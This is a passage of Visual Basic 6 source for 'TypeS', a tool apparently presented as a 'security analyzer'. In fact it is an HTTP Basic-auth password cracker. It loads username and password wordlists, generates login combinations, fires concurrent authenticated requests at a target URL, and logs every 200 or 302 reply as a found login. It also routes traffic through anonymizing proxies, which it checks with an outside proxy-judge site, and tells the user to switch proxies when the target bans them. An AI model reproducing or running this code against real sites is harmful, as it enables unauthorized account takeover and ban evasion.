                        login(iCOunt) = strUser(i) & strPass(i) & ":" & strUser(i)
                        iCOunt = iCOunt + 1
                    Next i
                                        
            End Select
        End If
    Next L
    
    pb1.Value = 0
    Screen.MousePointer = 1
    logIT UBound(login) + 1 & " login's...", &HFFFF&, Output
    sdrMove.Min = 0
    sdrMove.Max = UBound(login)

End Sub

Private Sub Form_Load()
    
    If App.PrevInstance Then Unload Me
    
    Dim fnum As Integer
    Dim strTemp As String
    Dim varTemp As Variant
    Dim listX As ListItem
    Dim dURLS As Dictionary
    Dim iCOunt As Long
    Dim i As Long
    Dim x As Long
    
    On Error Resume Next
    
    frmSplash.Show , Me
    
    'dictionary object used for removing dupes in the history...
    Set dURLS = CreateObject("Scripting.Dictionary")
    dURLS.CompareMode = TextCompare
    
    frmMain.Show
    Toolbar1.Enabled = False
    
    'Load History...
    logIT "Loading history...", &HFFFF&, Output
    frmSplash.Status.Caption = "Loading :: history..."
    fnum = FreeFile
    Open App.Path & "\history.lst" For Input As #fnum
        If Not LOF(fnum) = 0 Then
            While Not EOF(fnum)
                Line Input #fnum, strTemp
                varTemp = Split(strTemp, "|")
                
                If dURLS.Exists(varTemp(0)) = False Then
                    
                    dURLS.Add varTemp(0), 1
                    Set listX = lvHistory.ListItems.Add
                        listX.Text = varTemp(0)
                        listX.SubItems(1) = varTemp(1)
                
                End If
            Wend
                
        End If
    Close #fnum
    Set dURLS = Nothing
    DoEvents
    
    'Load username's...
    logIT "Loading login's...", &HFFFF&, Output
    frmSplash.Status.Caption = "Loading :: login's..."
    iCOunt = 0
    Open App.Path & "\user.lis" For Input As #fnum
        While Not EOF(fnum)
            Line Input #fnum, strTemp
            ReDim Preserve strUser(iCOunt)
            strUser(iCOunt) = Trim(strTemp)
            iCOunt = iCOunt + 1
        Wend
    Close #fnum
    DoEvents
    
    'Load password's...
    iCOunt = 0
    Open App.Path & "\pass.lis" For Input As #fnum
        While Not EOF(fnum)
            Line Input #fnum, strTemp
            ReDim Preserve strPass(iCOunt)
            strPass(iCOunt) = Trim(strTemp)
            iCOunt = iCOunt + 1
        Wend
    Close #fnum
    
    iCOunt = 0
    For i = 0 To UBound(strUser)
        ReDim Preserve login(iCOunt)
        login(iCOunt) = strUser(i) & ":" & strPass(i)
        iCOunt = iCOunt + 1
    Next i
    
    'Load login's...
    sdrMove.Min = 0
    sdrMove.Max = UBound(login)
        
    lstManip.AddItem "pass:user"
    lstManip.AddItem "user:user"
    lstManip.AddItem "pass:pass"
    lstManip.AddItem "user:userpass"
    lstManip.AddItem "userpass:user"
    
    For i = 0 To lstManip.ListCount - 1
        lstManip.Selected(i) = True
    Next i
    
    iCOunt = 0
    For i = 0 To UBound(strUser)
        lstUsers.AddItem strUser(i)
        iCOunt = iCOunt + 1
    Next i
    Frame2.Caption = "Username: " & iCOunt
    
    iCOunt = 0
    For x = 0 To UBound(strPass)
        lstPasses.AddItem strPass(x)
        iCOunt = iCOunt + 1
    Next x
    Frame3.Caption = "Password: " & iCOunt
    
    'Load proxies..."
    If GetSetting("TYPES", "CONFIG", "USEPROXY") = 1 Then
        logIT "Loading proxies...", &HFFFF&, Output
        Open App.Path & "\Proxy.lis" For Input As #fnum
            While Not EOF(fnum)
                Line Input #fnum, strTemp
                varTemp = Split(strTemp, "|")
                Set listX = lvProxy.ListItems.Add
                    listX.Text = varTemp(0)
                    listX.SubItems(1) = varTemp(1)
                    listX.SubItems(2) = varTemp(2)
                    listX.SubItems(3) = varTemp(3)
            Wend
        Close #fnum
    Else
        lvProxy.Visible = False
    End If
    
    logIT "TypeS v" & App.Major & " Ready for action!", &HFFFF&, Output
    frmSplash.Status.Caption = "Logins: " & UBound(login) + 1
    StatusBar1.Panels(1).Text = "Welcome..."
    Toolbar1.Enabled = True
    pb2.Max = 1000
    pb2.Min = 0
    
    tmrSplash.Enabled = True

End Sub

Private Sub Form_Paint()
    
    On Error Resume Next
    
    Frame2.Height = Me.ScaleHeight - 4600
    lstUsers.Height = Me.ScaleHeight - 4900
    Frame3.Height = Me.ScaleHeight - 4600
    lstPasses.Height = Me.ScaleHeight - 4900
    Frame1.Top = Frame2.Height + 100
    Picture7.Height = TabStrip2.Height - 400
    Picture8.Height = TabStrip2.Height - 400
    Picture9.Height = TabStrip2.Height - 400
    TabStrip2.Height = Me.ScaleHeight - 2930
    lvMain.Height = Me.ScaleHeight - 3400
    lvProxy.Height = Me.ScaleHeight - 3400
    lvProxy.Height = Me.ScaleHeight - 3400
    TabStrip1.Top = TabStrip2.Height + 800
    Picture1.Top = TabStrip2.Height + 800
    Picture5.Top = TabStrip2.Height + 800
    Picture4.Top = TabStrip2.Height + 800
    Picture2.Top = TabStrip2.Height + 800
    Picture3.Top = TabStrip2.Height + 800
    pb1.Top = StatusBar1.Top + 50

End Sub

Private Sub Form_Resize()
    
    On Error Resume Next
    
    If Me.WindowState = 2 Then
        Me.WindowState = 0
        Me.Width = 8175
        Me.Top = 0
        Me.Left = 0
        Me.Height = Screen.Height - 400
        Form_Paint
    Else
        Me.Width = 8175
        Form_Paint
    End If

End Sub

Private Sub Form_Unload(Cancel As Integer)

    Dim fnum As Long
    Dim i As Long
    
    On Error Resume Next
    
    Screen.MousePointer = 11
    fnum = FreeFile
    
    'Save proxies (if any)
    logIT "Saving proxies's...", &HFFFF&, Output
    If Not lvProxy.ListItems.Count = 0 Then
        Open App.Path & "\Proxy.lis" For Output As #fnum
            For i = 1 To lvProxy.ListItems.Count
                Print #fnum, lvProxy.ListItems(i).Text & "|" & lvProxy.ListItems(i).ListSubItems(1).Text & "|" & lvProxy.ListItems(i).ListSubItems(2).Text & "|" & lvProxy.ListItems(i).ListSubItems(3).Text
            Next i
        Close #fnum
    End If
    
    'Save logins (if any)
    logIT "Saving logins's...", &HFFFF&, Output
    If Not Len(txtLogins.Text) = 0 Then
        Open App.Path & "\Logins.txt" For Append As #fnum
            Print #fnum, txtLogins.Text
        Close #fnum
    End If
    
    'Save History...
    logIT "Saving history...", &HFFFF&, Output
    Open App.Path & "\history.lst" For Output As #fnum
        For i = 1 To lvHistory.ListItems.Count
            Print #fnum, lvHistory.ListItems(i).Text & "|" & lvHistory.ListItems(i).ListSubItems(1).Text
        Next i
    Close #fnum
    DoEvents
    
    'Save useranme's...
    logIT "Saving username's...", &HFFFF&, Output
    Open App.Path & "\user.lis" For Output As #fnum
        For i = 0 To UBound(strUser)
            Print #fnum, strUser(i)
        Next i
    Close #fnum
    DoEvents
    
    'Save password's...
    logIT "Saving password's...", &HFFFF&, Output
    Open App.Path & "\pass.lis" For Output As #fnum
        For i = 0 To UBound(strPass)
            Print #fnum, strPass(i)
        Next i
    Close #fnum
    Screen.MousePointer = 1

End Sub

Private Sub HTTPbot_Close(Index As Integer)

    Dim intPort As Integer
    Dim i As Long
    
    On Error Resume Next
    
    tmrBot(Index).Enabled = False
    Unload tmrBot(Index)
    Unload HTTPbot(Index)
    lvMain.ListItems(Index).ListSubItems(1).Text = "Session stopped."
    lvMain.ListItems(Index).ListSubItems(2).Text = "---"
    
    StatusBar1.Panels(3).Text = userCount & "/" & UBound(login) + 1
    
    If userCount >= UBound(login) + 1 Then
        
        If Not sessionComplete Then
            frmWait.Show , frmMain
            logIT "Session complete: " & Now, &HFFFF&, Output
            pb1.Value = 0
            sessionComplete = True
            StatusBar1.Panels(1).Text = "Session complete!"
            tmrPercent.Enabled = False
            inSession = False
            TabStrip1.Tabs(1).Selected = True
            PlayWav GetSetting("TYPES", "SOUNDS", "FINISHEDs")
            Me.Caption = "TypeS - Security analyzer"
            frmMain.mnuStop.Enabled = False
            tmrHPS.Enabled = False
        End If
        
    Else
    
        If Not stopSession Then
        
            lvMain.ListItems(Index).ListSubItems(1).Text = "Connecting..."
            lvMain.ListItems(Index).ListSubItems(2).Text = login(userCount)
            
            If GetSetting("TYPES", "CONFIG", "USEPROXY") = 1 Then
                
                'Setup proxy...
                strRemoteHost = lvProxy.SelectedItem.Text
                intPort = lvProxy.SelectedItem.ListSubItems(1).Text
                strFilePath = strURL
                
                If Not Left(strFilePath, 7) = "http://" Then
                    strFilePath = "http://" & strFilePath
                End If
                
            Else
                
                'Don't use proxy...
                intPort = 80
                
                If Left(strURL, 7) = "http://" Then
                    strURL = Mid(strURL, 8)
                End If
                
                strRemoteHost = Left(strURL, InStr(1, strURL, "/") - 1)
                strFilePath = Mid(strURL, InStr(1, strURL, "/"))
            
            End If
            
            userCount = userCount + 1
            Load tmrBot(Index)
            tmrBot(Index).Interval = botTimeout
            tmrBot(Index).Enabled = True
            Load HTTPbot(Index)
            With HTTPbot(Index)
                .Close
                .LocalPort = 0
                .Connect strRemoteHost, intPort
            End With
            
        Else
                    
            lvMain.ListItems(Index).ListSubItems(1).Text = "Session stopped."
            lvMain.ListItems(Index).ListSubItems(2).Text = "---"
            pb1.Value = 0
            Me.Caption = "TypeS - Security analyzer"
            tmrPercent.Enabled = False
            frmMain.Toolbar1.Buttons(1).ButtonMenus(1).Enabled = True
            frmMain.Toolbar1.Buttons(1).ButtonMenus(3).Enabled = False
            inSession = False
            StatusBar1.Panels(1).Text = "Stopped."
            frmMain.mnuStop.Enabled = False
        
        End If
    
    End If

End Sub

Private Sub HTTPbot_Connect(Index As Integer)

    Dim HTTPRequest As String
    Dim tHost As String
    
    On Error Resume Next
    
    intHPS = intHPS + 1
    tHost = Left(strURL, InStr(1, strURL, "/") - 1)
    lvMain.ListItems(Index).ListSubItems(1).Text = "Connected! Trying to Authenticate..."
    
    If Not stopSession Then
    
        HTTPRequest = "GET " & strFilePath & " HTTP/1.1" & vbCrLf
        HTTPRequest = HTTPRequest & "Host: " & tHost & vbCrLf
        HTTPRequest = HTTPRequest & "Connection: close" & vbCrLf
        HTTPRequest = HTTPRequest & "Accept: */*" & vbCrLf
        HTTPRequest = HTTPRequest & "Authorization: Basic "
        HTTPRequest = HTTPRequest & CStr(Base64_Encode(lvMain.ListItems(Index).ListSubItems(2).Text)) & vbCrLf
        HTTPRequest = HTTPRequest & vbCrLf
        
        Debug.Print "THOST: " & tHost
        Debug.Print "STRURL: " & strURL
        Debug.Print "HTTPREQUEST: " & HTTPRequest
        
        pb1.Value = userCount
        tmrBot(Index).Enabled = True
        HTTPbot(Index).SendData HTTPRequest
        DoEvents
        
    Else
        
        lvMain.ListItems(Index).ListSubItems(1).Text = "Session stopped."
        lvMain.ListItems(Index).ListSubItems(2).Text = "---"
        pb1.Value = 0
        Me.Caption = "TypeS - Security analyzer"
        tmrPercent.Enabled = False
        frmMain.Toolbar1.Buttons(1).ButtonMenus(1).Enabled = True
        frmMain.Toolbar1.Buttons(1).ButtonMenus(3).Enabled = False
        Unload tmrBot(Index)
        Unload HTTPbot(Index)
        inSession = False
        StatusBar1.Panels(1).Text = "Stopped."
        frmMain.mnuStop.Enabled = False
        
    End If
    
    DoEvents

End Sub

Private Sub HTTPbot_DataArrival(Index As Integer, ByVal bytesTotal As Long)
    
    Dim sData As String
    Dim varHeader As Variant
    
    On Error Resume Next
    
    HTTPbot(Index).GetData sData
    Debug.Print sData
    
    varHeader = Split(sData, vbCrLf)
    Select Case varHeader(0)
    
        'I know there are better way's to do this but this was the easiest :)~
        Case "HTTP/1.1 400 Bad Request"
            lvMain.ListItems(Index).ListSubItems(1).Text = "HTTP/1.1 400 Bad Request"
            lvStatus.ListItems(2).ListSubItems(1).Text = lvStatus.ListItems(2).ListSubItems(1).Text + 1
            
        Case "HTTP/1.1 401 Authorization Required"
            lvMain.ListItems(Index).ListSubItems(1).Text = "HTTP/1.1 401 Authorization Required"
            lvStatus.ListItems(1).ListSubItems(1).Text = lvStatus.ListItems(1).ListSubItems(1).Text + 1
        
        Case "HTTP/1.0 401 Authorization Required"
            lvMain.ListItems(Index).ListSubItems(1).Text = "HTTP/1.1 401 Authorization Required"
            lvStatus.ListItems(1).ListSubItems(1).Text = lvStatus.ListItems(1).ListSubItems(1).Text + 1
        
        Case "HTTP/1.1 404 Not Found"
            lvStatus.ListItems(3).ListSubItems(1).Text = lvStatus.ListItems(3).ListSubItems(1).Text + 1
        
        Case "HTTP/1.0 404 Not Found"
            lvStatus.ListItems(3).ListSubItems(1).Text = lvStatus.ListItems(3).ListSubItems(1).Text + 1
        
        Case "HTTP/1.1 404 Object Not Found"
            lvStatus.ListItems(3).ListSubItems(1).Text = lvStatus.ListItems(3).ListSubItems(1).Text + 1
        
        Case "HTTP/1.1 200 OK"
            lvMain.ListItems(Index).ListSubItems(1).Text = "HTTP/1.1 200 OK"
            logIT "Found - " & lvMain.ListItems(Index).ListSubItems(2).Text, &HFFFFFF, Output
            txtLogins.Text = txtLogins.Text & lvMain.ListItems(Index).ListSubItems(2).Text & " | " & strURL & vbCrLf
            lvStatus.ListItems(7).ListSubItems(1).Text = lvStatus.ListItems(7).ListSubItems(1).Text + 1
            PlayWav GetSetting("TYPES", "SOUNDS", "FOUNDs")
            intFound = intFound + 1
            
        Case "HTTP/1.0 200 OK"
            lvMain.ListItems(Index).ListSubItems(1).Text = "HTTP/1.1 200 OK"
            logIT "Found - " & lvMain.ListItems(Index).ListSubItems(2).Text, &HFFFFFF, Output
            txtLogins.Text = txtLogins.Text & lvMain.ListItems(Index).ListSubItems(2).Text & " | " & strURL & vbCrLf
            lvStatus.ListItems(7).ListSubItems(1).Text = lvStatus.ListItems(7).ListSubItems(1).Text + 1
            PlayWav GetSetting("TYPES", "SOUNDS", "FOUNDs")
            intFound = intFound + 1

        Case "HTTP/1.1 401 Access Denied"
            lvMain.ListItems(Index).ListSubItems(1).Text = "HTTP/1.1 401 Authorization Required"
            lvStatus.ListItems(1).ListSubItems(1).Text = lvStatus.ListItems(1).ListSubItems(1).Text + 1

        Case "HTTP/1.0 401 Access Denied"
            lvMain.ListItems(Index).ListSubItems(1).Text = "HTTP/1.1 401 Authorization Required"
            lvStatus.ListItems(1).ListSubItems(1).Text = lvStatus.ListItems(1).ListSubItems(1).Text + 1
        
        Case "HTTP/1.0 403 Forbidden"
            lvMain.ListItems(Index).ListSubItems(1).Text = "HTTP/1.0 403 Forbidden"
            lvStatus.ListItems(6).ListSubItems(1).Text = lvStatus.ListItems(6).ListSubItems(1).Text + 1
            intBan = intBan + 1
            
        Case "HTTP/1.1 403 Forbidden"
            lvMain.ListItems(Index).ListSubItems(1).Text = "HTTP/1.0 403 Forbidden"
            lvStatus.ListItems(6).ListSubItems(1).Text = lvStatus.ListItems(6).ListSubItems(1).Text + 1
            intBan = intBan + 1
        
        Case "HTTP/1.0 407 Proxy Authentication Required"
            If Not stopSession Then
                MsgBox "This proxy requires authentication!", vbCritical
                stopSession = True
            End If
            
        Case "HTTP/1.1 504 Gateway Time-Out"
            lvMain.ListItems(Index).ListSubItems(1).Text = "HTTP/1.1 504 Gateway Time-Out"
            lvStatus.ListItems(8).ListSubItems(1).Text = lvStatus.ListItems(8).ListSubItems(1).Text + 1

        Case "HTTP/1.1 302 Found"
            lvMain.ListItems(Index).ListSubItems(1).Text = "HTTP/1.1 200 OK"
            logIT "Found - " & lvMain.ListItems(Index).ListSubItems(2).Text, &HFFFFFF, Output
            txtLogins.Text = txtLogins.Text & lvMain.ListItems(Index).ListSubItems(2).Text & " | " & strURL & vbCrLf
            lvStatus.ListItems(7).ListSubItems(1).Text = lvStatus.ListItems(7).ListSubItems(1).Text + 1
            PlayWav GetSetting("TYPES", "SOUNDS", "FOUNDs")
            intFound = intFound + 1
            
        Case "HTTP/1.0 302 Found"
            lvMain.ListItems(Index).ListSubItems(1).Text = "HTTP/1.1 200 OK"
            logIT "Found - " & lvMain.ListItems(Index).ListSubItems(2).Text, &HFFFFFF, Output
            txtLogins.Text = txtLogins.Text & lvMain.ListItems(Index).ListSubItems(2).Text & " | " & strURL & vbCrLf
            lvStatus.ListItems(7).ListSubItems(1).Text = lvStatus.ListItems(7).ListSubItems(1).Text + 1
            PlayWav GetSetting("TYPES", "SOUNDS", "FOUNDs")
            intFound = intFound + 1

        Case Else
        
            If GetSetting("TYPES", "CONFIG", "VERBOSE") = 1 Then
                DLogIT " [" & Index & "] Unreconized response: " & sData, &HC0&, frmDebug.Output
            End If
            
            lvMain.ListItems(Index).ListSubItems(1).Text = varHeader(0)
            lvStatus.ListItems(5).ListSubItems(1).Text = lvStatus.ListItems(5).ListSubItems(1).Text + 1
            Debug.Print sData
            
    End Select
    
    HTTPbot(Index).Close
    HTTPbot_Close Index
    DoEvents
    
End Sub

Private Sub HTTPbot_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    
    On Error Resume Next
    
    intErr = intErr + 1
        
    If Description = "No route to host." Then
        MsgBox "Please make sure that you are connected to the internet!", vbCritical
        stopSession = True
    End If
    
    If GetSetting("TYPES", "CONFIG", "VERBOSE") = 1 Then
        DLogIT "[" & Index & "] Bot Error: " & Description, &HC0&, frmDebug.Output
    End If

    lvStatus.ListItems(9).ListSubItems(1).Text = lvStatus.ListItems(9).ListSubItems(1).Text + 1
    lvMain.ListItems(Index).ListSubItems(1).Text = "ERROR: " & Description
    HTTPbot(Index).Close
    HTTPbot_Close Index
    
End Sub

Private Sub lstManip_Click()

    DoManip

End Sub

Private Sub lvHistory_DblClick()
    
    If lvHistory.ListItems.Count = 0 Then Exit Sub
    Select Case lvHistory.SelectedItem.ListSubItems(1).Text
        
        Case "HTTP"
            strURL = Trim(lvHistory.SelectedItem.Text)
            If Left(strURL, 7) = "http://" Then
                strURL = Mid(strURL, 8)
            End If
            startHTTP
            
    End Select
    
End Sub

Private Sub lvHistory_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)

    If Button = 2 Then
        PopupMenu mnuDel
    End If

End Sub

Private Sub lvProxy_Click()

    logIT "Using proxy: " & lvProxy.SelectedItem.Text & ":" & lvProxy.SelectedItem.ListSubItems(1).Text, &HFFFF&, Output

End Sub

Private Sub mnuDelete_Click()

    lvHistory.ListItems.Remove lvHistory.SelectedItem.Index

End Sub

Private Sub mnuExit_Click()

    If inSession Then
        MsgBox "Cannot access this while session is in progress!", vbCritical
        Exit Sub
    End If
    
    Tray1.RemoveTrayIcon
    Unload Me

End Sub

Private Sub mnuRestore_Click()

    frmMain.Show
    Tray1.RemoveTrayIcon

End Sub

Private Sub mnuStop_Click()

    If MsgBox("Are you sure?", vbQuestion + vbYesNo) = vbYes Then
        stopSession = True
        frmWait.Show 1
    End If

End Sub

Private Sub Proxy_Close()
        
    tmrProxySpeed.Enabled = False
    tmrProxy.Enabled = False
    
    lvProxy.SelectedItem.ListSubItems(2).Text = proxySPD & " ms"
    inSession = False

End Sub

Private Sub Proxy_Connect()

    Dim HTTPRequest As String
   
    On Error Resume Next
    
    lvProxy.SelectedItem.ListSubItems(3).Text = "Connected!"
    HTTPRequest = "GET http://www.nippon.to/cgi-bin/prxjdg.cgi HTTP/1.1" & vbCrLf
    HTTPRequest = HTTPRequest & "Host: www.nippon.to" & vbCrLf
    HTTPRequest = HTTPRequest & "Connection: close" & vbCrLf
    HTTPRequest = HTTPRequest & "Accept: */*" & vbCrLf
    HTTPRequest = HTTPRequest & vbCrLf
    Proxy.SendData HTTPRequest
    
    tmrProxy.Enabled = True

End Sub

Private Sub Proxy_DataArrival(ByVal bytesTotal As Long)

    Dim sData As String
    Dim varHeader As Variant
    Dim varTemp1 As Variant
    
    On Error Resume Next
    
    Proxy.GetData sData, vbString
    Debug.Print sData
    
    varHeader = Split(sData, vbCrLf)
    Select Case varHeader(0)
    
        Case "HTTP/1.1 400 Bad Request"
            lvProxy.SelectedItem.ListSubItems(3).Text = "HTTP/1.1 400 Bad Request"
            
        Case "HTTP/1.1 401 Authorization Required"
            lvProxy.SelectedItem.ListSubItems(3).Text = "HTTP/1.1 401 Authorization Required"
        
        Case "HTTP/1.0 401 Authorization Required"
            lvProxy.SelectedItem.ListSubItems(3).Text = "HTTP/1.0 401 Authorization Required"
        
        Case "HTTP/1.1 404 Not Found"
            lvProxy.SelectedItem.ListSubItems(3).Text = "HTTP/1.1 404 Not Found"
        
        Case "HTTP/1.0 404 Not Found"
            lvProxy.SelectedItem.ListSubItems(3).Text = "HTTP/1.0 404 Not Found"
        
        Case "HTTP/1.1 404 Object Not Found"
            lvProxy.SelectedItem.ListSubItems(3).Text = "HTTP/1.1 404 Object Not Found"
        
        Case "HTTP/1.1 200 OK"
            lvProxy.SelectedItem.ListSubItems(3).Text = "ANON LEVEL: " & Mid(sData, InStr(1, sData, "AnonyLevel", vbTextCompare) + 47, 1)
            
        Case "HTTP/1.0 200 OK"
            lvProxy.SelectedItem.ListSubItems(3).Text = "ANON LEVEL: " & Mid(sData, InStr(1, sData, "AnonyLevel", vbTextCompare) + 47, 1)
            
        Case "HTTP/1.1 401 Access Denied"
            lvProxy.SelectedItem.ListSubItems(3).Text = "HTTP/1.1 401 Access Denied"

        Case "HTTP/1.0 401 Access Denied"
            lvProxy.SelectedItem.ListSubItems(3).Text = "HTTP/1.0 401 Access Denied"
        
        Case "HTTP/1.0 403 Forbidden"
            lvProxy.SelectedItem.ListSubItems(3).Text = "HTTP/1.0 403 Forbidden"
            
        Case "HTTP/1.1 403 Forbidden"
            lvProxy.SelectedItem.ListSubItems(3).Text = "HTTP/1.1 403 Forbidden"
        
        Case "HTTP/1.0 407 Proxy Authentication Required"
            lvProxy.SelectedItem.ListSubItems(3).Text = "HTTP/1.0 407 Proxy Authentication Required"
            
        Case "HTTP/1.1 504 Gateway Time-Out"
            lvProxy.SelectedItem.ListSubItems(3).Text = "HTTP/1.1 504 Gateway Time-Out"

        Case "HTTP/1.1 302 Found"
            lvProxy.SelectedItem.ListSubItems(3).Text = "ANON LEVEL: " & Mid(sData, InStr(1, sData, "AnonyLevel", vbTextCompare) + 47, 1)
            
        Case "HTTP/1.0 302 Found"
            lvProxy.SelectedItem.ListSubItems(3).Text = "ANON LEVEL: " & Mid(sData, InStr(1, sData, "AnonyLevel", vbTextCompare) + 47, 1)
            
        Case Else
            lvProxy.SelectedItem.ListSubItems(3).Text = "Unreconized response?!?"
            
    End Select
    
    Proxy.Close
    Proxy_Close
    DoEvents

End Sub

Private Sub Proxy_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)

    lvProxy.SelectedItem.ListSubItems(3).Text = Description
    Proxy.Close
    Proxy_Close

End Sub

Private Sub sdrMove_Scroll()
    
    userCount = sdrMove.Value

End Sub

Private Sub TabStrip1_Click()

    Select Case TabStrip1.SelectedItem.Caption
        
        Case "Status"
            Picture3.Visible = False
            Picture4.Visible = False
            Picture2.Visible = True
            Picture5.Visible = False
            Picture1.Visible = False
        
        Case "Session Stats."
            Picture3.Visible = True
            Picture4.Visible = False
            Picture2.Visible = False
            Picture1.Visible = False
            Picture5.Visible = False
            
        Case "Found Logins"
            Picture3.Visible = False
            Picture4.Visible = True
            Picture2.Visible = False
            Picture5.Visible = False
            Picture1.Visible = False
            
        Case "History"
            Picture3.Visible = False
            Picture4.Visible = False
            Picture2.Visible = False
            Picture5.Visible = True
            Picture1.Visible = False
            
        Case "Performance"
            Picture3.Visible = False
            Picture4.Visible = False
            Picture2.Visible = False
            Picture5.Visible = False
            Picture1.Visible = True
        
    End Select

End Sub

Private Sub TabStrip2_Click()

    Select Case TabStrip2.SelectedItem.Caption
        
        Case "Bots"
            Picture7.Visible = True
            Picture9.Visible = False
            Picture8.Visible = False
        Case "Proxies"
            Picture7.Visible = False
            Picture9.Visible = False
            Picture8.Visible = True
        Case "Wordlist"
            Picture7.Visible = False
            Picture9.Visible = True
            Picture8.Visible = False
    End Select

End Sub

Private Sub tmrBanned_Timer()

    On Error Resume Next
    
    If intBan > 10 Then
        If Not MsgBox("It appears that you have been banned from this website!" & vbCrLf & "You can get around this by using a different proxy." & vbCrLf & "Do you want to continue?", vbCritical + vbYesNo) = vbYes Then
            frmWait.Show , frmMain
            stopSession = True
        End If
    End If
    tmrBanned.Enabled = False

End Sub

Private Sub tmrBot_Timer(Index As Integer)
    
    'This makes sure the Bot (or socket) dosn't hang.
    
    Dim intPort As Integer
    
    If Not stopSession Then
    
        lvMain.ListItems(Index).ListSubItems(1).Text = "Retrying..."
        lvStatus.ListItems(4).ListSubItems(1).Text = lvStatus.ListItems(4).ListSubItems(1).Text + 1
        
        If GetSetting("TYPES", "CONFIG", "USEPROXY") = 1 Then
            
            'Setup proxy...
            strRemoteHost = lvProxy.SelectedItem.Text
            intPort = lvProxy.SelectedItem.ListSubItems(1).Text
            strFilePath = strURL
            
            If Not Left(strFilePath, 7) = "http://" Then
                strFilePath = "http://" & strFilePath
            End If
            
        Else
            
            'Don't use proxy...
            intPort = 80
            
            If Left(strURL, 7) = "http://" Then
                strURL = Mid(strURL, 8)
            End If
            
            strRemoteHost = Left(strURL, InStr(1, strURL, "/") - 1)
            strFilePath = Mid(strURL, InStr(1, strURL, "/"))
        
        End If
        
        With HTTPbot(Index)
            .Close
            .LocalPort = 0
            .Connect strRemoteHost, intPort
        End With
        
    Else
    
        lvMain.ListItems(Index).ListSubItems(1).Text = "Session stopped."
        lvMain.ListItems(Index).ListSubItems(2).Text = "---"
        pb1.Value = 0
        Me.Caption = "TypeS - Security analyzer"
        tmrPercent.Enabled = False
        frmMain.Toolbar1.Buttons(1).ButtonMenus(1).Enabled = True
        frmMain.Toolbar1.Buttons(1).ButtonMenus(3).Enabled = False
        Unload tmrBot(Index)
        Unload HTTPbot(Index)
        inSession = False
        StatusBar1.Panels(1).Text = "Stopped."
        frmMain.mnuStop.Enabled = False
    
    End If

End Sub

Private Sub tmrFakes_Timer()
    
    On Error Resume Next
    
    If intFound > 5 Then
        If Not MsgBox("You have just received " & intFound & " OK reply's in 2 seconds!" & vbCrLf & "Do you want to continue?", vbCritical + vbYesNo) = vbYes Then
            frmWait.Show , frmMain
            stopSession = True
        End If
    End If
    tmrFakes.Enabled = False

End Sub

Private Sub tmrHPS_Timer()
    
    On Error Resume Next
    lblHPM.Caption = intHPS / 2 * 30
    pb2.Value = intHPS / 2 * 30
    intHPS = 0

End Sub

Private Sub tmrPercent_Timer()

    Me.Caption = "TypeS - " & Percent(pb1.Value + 1, pb1.Max, pb1.Max) & "%"
    Tray1.ToolTipText = "TypeS - " & Percent(pb1.Value + 1, pb1.Max, pb1.Max) & "%"

End Sub

Private Sub tmrProxy_Timer()
    
    lvProxy.SelectedItem.ListSubItems(3).Text = "Timeout..."
    Proxy.Close
    inSession = False

End Sub

Private Sub tmrProxySpeed_Timer()

    proxySPD = proxySPD + 1

End Sub

Private Sub tmrSplash_Timer()

    Unload frmSplash
    tmrSplash.Enabled = False

End Sub

Private Sub Toolbar1_ButtonClick(ByVal Button As MSComctlLib.Button)
   
    Select Case Button.Caption
        
        Case "Proxies"
            If inSession Then
                MsgBox "Cannot access this while session is in progress!", vbCritical
                Exit Sub
            End If
            
            TabStrip2.Tabs(2).Selected = True
        
        Case "About"
            frmAbout.Show 1
        
        Case "Session"
            If inSession Then
                MsgBox "Cannot access this while session is in progress!", vbCritical
                Exit Sub
            End If
            
            frmHTTP.Show 1
        
        Case "Wordlist"
            If inSession Then
                MsgBox "Cannot access this while session is in progress!", vbCritical
                Exit Sub
            End If
            
            TabStrip2.Tabs(3).Selected = True
        
        Case "Setup"
            If inSession Then
                MsgBox "Cannot access this while session is in progress!", vbCritical
                Exit Sub
            End If
            
            frmSetup.Show 1
        
        Case "Exit"
            If inSession Then
                MsgBox "Cannot access this while session is in progress!", vbCritical
                Exit Sub
            End If
            
            Unload Me
        
    End Select

End Sub

Private Sub Toolbar1_ButtonMenuClick(ByVal ButtonMenu As MSComctlLib.ButtonMenu)
    
    Dim fnum As Integer
    Dim strTemp As String
    Dim iCOunt As Long
    Dim varAuth As Variant
    Dim listX As ListItem
    Dim varTemp As Variant
    Dim i, x As Long
            
    On Error Resume Next
    
    Select Case ButtonMenu.Key
    
        Case "validate"
            If lvProxy.ListItems.Count = 0 Then Exit Sub
            
            TabStrip2.Tabs(2).Selected = True
            pb1.Value = 0
            pb1.Max = lvProxy.ListItems.Count
            
            For i = 1 To lvProxy.ListItems.Count
                pb1.Value = i
                lvProxy.ListItems(i).Selected = True
                lvProxy.ListItems(i).EnsureVisible
                lvProxy.ListItems(i).ListSubItems(3).Text = "Connecting..."
                
                proxySPD = 0
                tmrProxySpeed.Enabled = True
                tmrProxy.Enabled = False
                
                Proxy.Close
                Proxy.LocalPort = 0
                Proxy.Connect Trim(lvProxy.ListItems(i).Text), Trim(lvProxy.ListItems(i).ListSubItems(1).Text)
                inSession = True
                
                While inSession
                    DoEvents
                Wend
            Next i
                        
            pb1.Value = 0
            
            For i = 1 To lvProxy.ListItems.Count
                For x = 1 To lvProxy.ListItems.Count
                    If Not Mid(lvProxy.ListItems(x).ListSubItems(3).Text, 1, 4) = "ANON" Then
                        lvProxy.ListItems.Remove x
                    End If
                Next x
            Next i
    
        Case "loadProxies"
            TabStrip2.Tabs(2).Selected = True
            cd1.DialogTitle = "Select proxy file..."
            cd1.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*|"
            cd1.ShowOpen
            
            If Len(cd1.FileName) = 0 Then Exit Sub
            
            StatusBar1.Panels(1).Text = "Loading proxy file..."
            fnum = FreeFile
            Open cd1.FileName For Input As #fnum
                pb1.Max = LOF(fnum)
                While Not EOF(fnum)
                    Line Input #fnum, strTemp
                    
                    pb1.Value = Seek(fnum) + 1
                    varTemp = Split(strTemp, ":")
                    Set listX = lvProxy.ListItems.Add
                        listX.Text = varTemp(0)
                        listX.SubItems(1) = varTemp(1)
                        listX.SubItems(2) = "--"
                        listX.SubItems(3) = "n/a"
                Wend
                
            Close #fnum
